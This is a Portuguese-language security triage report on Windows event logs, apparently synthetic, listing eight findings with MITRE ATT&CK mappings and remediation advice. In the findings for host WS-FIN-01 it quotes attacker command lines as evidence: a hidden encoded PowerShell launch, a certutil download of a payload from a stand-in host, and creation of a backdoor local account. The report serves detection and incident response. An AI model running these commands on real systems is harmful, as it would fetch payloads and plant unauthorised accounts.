# Relatório de Triagem - Logs do Windows

Eventos analisados: **24** | Achados: **8**

| Severidade | Quantidade |
|---|---|
| CRITICAL | 1 |
| HIGH | 6 |
| MEDIUM | 1 |

## 1. [CRITICAL] Logon bem-sucedido de 203.0.113.45 após ataque de senhas

**MITRE ATT&CK:** T1078 (após T1110)

Um IP que fez tentativas de adivinhar senhas conseguiu autenticar. Tratar a conta como comprometida.

- Hora: 2026-10-01 09:17:30
- Conta: administrator (estava entre as contas atacadas)
- Tipo de logon: 10
- Host: SRV-RDP-01

**Recomendação:** Escalar ao analista sênior, isolar o host SRV-RDP-01, redefinir a senha de 'administrator', encerrar sessões e revisar atividade posterior.

## 2. [HIGH] Força bruta contra 'administrator' a partir de 203.0.113.45

**MITRE ATT&CK:** T1110.001

8 falhas de logon (4625) para a mesma conta em até 5 min.

- IP de origem: 203.0.113.45
- Conta alvo: administrator
- Janela: 2026-10-01 09:15:00 a 2026-10-01 09:16:45

**Recomendação:** Bloquear 203.0.113.45 no firewall, revisar a conta 'administrator' e habilitar MFA/bloqueio por tentativas.

## 3. [HIGH] Password spraying a partir de 198.51.100.77

**MITRE ATT&CK:** T1110.003

6 falhas contra 6 contas diferentes pelo mesmo IP em poucos minutos.

- IP de origem: 198.51.100.77
- Contas visadas: ana.lima, backup, carlos, fernanda, joao, suporte
- Janela: 2026-10-01 10:40:00 a 2026-10-01 10:41:40

**Recomendação:** Bloquear 198.51.100.77, verificar se alguma das contas teve logon bem-sucedido e forçar troca de senhas fracas.

## 4. [HIGH] Aplicativo Office iniciou cmd.exe

**MITRE ATT&CK:** T1204.002

Documento do Office abrindo um interpretador de comandos é típico de macro maliciosa.

- Hora: 2026-10-01 11:05:00
- Host: WS-FIN-01
- Usuário: maria.silva
- Processo: C:\Windows\System32\cmd.exe
- Linha de comando: cmd.exe /c whoami /all
- Processo pai: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE

**Recomendação:** Isolar o host, obter o documento de origem e verificar o e-mail que o entregou.

## 5. [HIGH] PowerShell com comando codificado

**MITRE ATT&CK:** T1059.001

Criação de processo (4688) com padrão associado a atividade maliciosa.

- Hora: 2026-10-01 11:05:20
- Host: WS-FIN-01
- Usuário: maria.silva
- Processo: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Linha de comando: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA

**Recomendação:** Validar com o usuário/host, coletar o processo pai e escalar se não for atividade legítima.

## 6. [HIGH] Download via certutil

**MITRE ATT&CK:** T1105

Criação de processo (4688) com padrão associado a atividade maliciosa.

- Hora: 2026-10-01 11:06:00
- Host: WS-FIN-01
- Usuário: maria.silva
- Processo: C:\Windows\System32\certutil.exe
- Linha de comando: certutil.exe -urlcache -f http://example.invalid/payload.bin C:\Users\Public\p.bin

**Recomendação:** Validar com o usuário/host, coletar o processo pai e escalar se não for atividade legítima.

## 7. [HIGH] Criação de usuário local

**MITRE ATT&CK:** T1136.001

Criação de processo (4688) com padrão associado a atividade maliciosa.

- Hora: 2026-10-01 11:07:00
- Host: WS-FIN-01
- Usuário: maria.silva
- Processo: C:\Windows\System32\net.exe
- Linha de comando: net user suporte2 Senh@123 /add

**Recomendação:** Validar com o usuário/host, coletar o processo pai e escalar se não for atividade legítima.

## 8. [MEDIUM] Reconhecimento: whoami com privilégios

**MITRE ATT&CK:** T1033

Criação de processo (4688) com padrão associado a atividade maliciosa.

- Hora: 2026-10-01 11:05:00
- Host: WS-FIN-01
- Usuário: maria.silva
- Processo: C:\Windows\System32\cmd.exe
- Linha de comando: cmd.exe /c whoami /all

**Recomendação:** Validar com o usuário/host, coletar o processo pai e escalar se não for atividade legítima.
